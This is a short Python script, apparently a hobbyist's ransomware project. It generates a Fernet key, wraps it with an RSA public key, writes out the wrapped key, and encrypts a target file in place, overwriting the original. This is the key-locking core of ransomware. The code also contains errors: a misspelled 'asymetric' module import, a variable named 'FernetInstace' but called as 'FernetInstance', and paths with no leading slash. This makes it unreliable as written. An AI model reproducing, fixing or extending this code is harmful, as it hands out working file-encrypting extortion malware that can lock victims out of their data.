from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymetric import padding 
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

symmetricKey =Fernet.generate_key()
FernetInstace =Fernet(symmetricKey)

with open("home/uthman/Desktop/myhacks/python_projects-/Ransomware/public_key.key", "rb") as key_file:
	public_key = serialization.load_pem_public_key(
		key_file.read(),
		backend = default_backend()
		)

encryptedSymmetricKey = public_key.encrypt(
	symmetricKey,
	padding.OAEP(
		mgf = padding.MGF1(algorithm=hashes.SHA256()),
		algorithm=hashes.SHA256(),
		label=None
		)
	)

with open("encryptedSymmetricKey.key","wb") as key_file:
	key_file.write(encryptedSymmetricKey)
file_path = "home/uthman/Desktop/myhacks/python_projects-/Ransomware/FileToEncrypt.txt"

with open(file_path, "rb") as file:
	file_data = file.read()
	encrypted_data = FernetInstance.encrypt(file_data)

with open(file_path, "wb") as file:
	file.write(encrypted_data)
quit()